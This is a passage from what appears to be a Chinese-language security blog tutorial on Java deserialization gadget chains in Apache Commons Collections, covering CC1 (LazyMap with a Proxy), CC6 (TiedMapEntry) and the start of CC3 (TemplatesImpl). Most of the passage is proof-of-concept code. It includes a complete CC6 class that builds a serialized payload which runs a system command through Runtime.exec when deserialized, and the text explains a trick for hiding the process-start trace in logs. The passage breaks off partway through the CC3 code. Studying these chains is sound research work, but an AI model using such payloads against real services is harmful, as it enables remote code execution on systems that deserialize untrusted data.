</span></span><span style=display:flex><span>        <span style=color:#111>proxyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;hello&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;world&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span> <span style=color:#111>proxyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;hello&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>result</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>回显Hook methd: get Hacked Object</p><p>回看<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，如果我们把这个对象用Proxy进行代理，那么readObject时只要调用任意方法 就会进入<code>AnnotationInvocationHandler#invoke</code>触发get</p><h4 id=构造>构造</h4><p>先是用LazyMap替换TransformedMap</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>然后对sun.reflect.annotation.AnnotationInvocationHandler进行Proxy</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Class</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Constructor</span> <span style=color:#111>construct</span> <span style=color:#f92672>=</span> <span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredConstructor</span><span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>)</span> <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>(</span><span style=color:#111>Retention</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>outerMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>Map</span> <span style=color:#111>proxyMap</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>)</span><span style=color:#111>Proxy</span><span style=color:#f92672>.</span><span style=color:#75af00>newProxyInstance</span><span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span> <span style=color:#111>handler</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>代理后的对象是proxyMap，但是不能直接对其序列化 我们的入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，还要再用AnnotationInvocationHandler对这个proxyMap包裹</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>)</span><span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>(</span><span style=color:#111>Retention</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>proxyMap</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>注意到ysoserial的末尾有new ConstantTransformer(1)，可以隐藏启动进程的日志特征</p><p>————注意：LazyMap的CC1同样无法解决8u71后的使用问题，尽管它的漏洞触发在get和invoke，和setValue无关</p><h2 id=cc6>CC6</h2><p>上面提到CC1由于<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>在8u71后的逻辑变化导致失效，这里来看一条解决高版本Java利用的CC6（代码部分来自p牛</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e> -&gt; Gadget chain:
</span></span></span><span style=display:flex><span><span style=color:#75715e> java.io.ObjectInputStream.readObject()
</span></span></span><span style=display:flex><span><span style=color:#75715e> java.util.HashMap.readObject()
</span></span></span><span style=display:flex><span><span style=color:#75715e> java.util.HashMap.hash()
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
</span></span></span><span style=display:flex><span><span style=color:#75715e> org.apache.commons.collections.map.LazyMap.get()
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>org.apache.commons.collections.functors.ChainedTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>org.apache.commons.collections.functors.InvokerTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e> java.lang.reflect.Method.invoke()
</span></span></span><span style=display:flex><span><span style=color:#75715e> java.lang.Runtime.exec()
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></div><p>CC6解决CC1的方案是在上下文中寻找其它可以调用<code>LazyMap.get</code>的地方，用到的是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>org.apache.commons.collections.keyvalue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.Serializable</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map.Entry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.KeyValue</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>TiedMapEntry</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>Entry</span><span style=color:#f92672>,</span> <span style=color:#111>KeyValue</span><span style=color:#f92672>,</span> <span style=color:#111>Serializable</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>final</span> <span style=color:#00a8c8>long</span> <span style=color:#111>serialVersionUID</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#111>8453869361373831205L</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#111>Map</span> <span style=color:#111>map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#111>Object</span> <span style=color:#111>key</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#75af00>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>Map</span> <span style=color:#111>map</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>key</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>map</span> <span style=color:#f92672>=</span> <span style=color:#111>map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>key</span> <span style=color:#f92672>=</span> <span style=color:#111>key</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getKey</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>key</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getValue</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>map</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>int</span> <span style=color:#75af00>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>getValue</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>getKey</span><span style=color:#f92672>()</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>?</span> <span style=color:#111>0</span> <span style=color:#f92672>:</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>getKey</span><span style=color:#f92672>().</span><span style=color:#75af00>hashCode</span><span style=color:#f92672>())</span> <span style=color:#f92672>^</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>(</span><span style=color:#111>value</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>?</span> <span style=color:#111>0</span> <span style=color:#f92672>:</span> <span style=color:#111>value</span><span style=color:#f92672>.</span><span style=color:#75af00>hashCode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ..
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>在它的<code>getValue</code>中调用了<code>this.map.get</code>，而hashCode方法调用了getValue（HashMap的实现原理），在ysoserial中是利用<code>java.util.HashSet#readObject</code>到<code>HashMap#put()</code>到<code>HashMap#hash(key)</code>最后到<code>TiedMapEntry#hashCode()</code></p><p>在p牛的简化poc中省略了前两步，通过<code>HashMap#readObject</code>直接到<code>HashMap#hash(key)</code>，hash中调用了<code>key.hashCode</code>（纯HashMap的实现原理</p><p>构造poc，我们只需要让这个key等于TiedMapEntry对象，再改动亿点点</p><p>首先是恶意LazyMap</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC6</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>fakeTransformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span><span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)};</span> <span style=color:#75715e>// 避免生成payload时触发RCE
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Class</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;calc.exe&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>fakeTransformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>	<span style=color:#75715e>// 得到被装饰后的恶意LazyMap对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>        <span style=color:#111>TiedMapEntry</span> <span style=color:#111>tme</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>outerMap</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;keykey&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>expMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>	<span style=color:#75715e>// 为了调用TiedMapEntry#hashCode 新建HashMap 并把tme作为key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>expMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>tme</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;valuevalue&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>remove</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;keykey&#34;</span><span style=color:#f92672>);</span>  <span style=color:#75715e>// put也会调用hash(key) 避免对后面get的影响
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;iTransformers&#34;</span><span style=color:#f92672>);</span>	<span style=color:#75715e>// 替换真正的transformers
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>,</span> <span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>	<span style=color:#75715e>// 序列化部分
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>expMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>	<span style=color:#75715e>// 触发
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span> <span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>逻辑是比较清晰的，每一部分也都比较好懂</p><h2 id=cc38u71>CC3(&lt;8u71</h2><p>由于<code>TemplatesImpl</code>可以直接控制字节码（即java代码），所以尝试结合CC1 demo和执行字节码的部分就可以构造出CC3（的一部分）了，需要注意的是要将<code>InvokerTransformer</code>执行的方法从显式的rce（getRuntime.exec）变为调用<code>TemplatesImpl::newTransformer</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.TransformedMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Base64</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC3mini</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
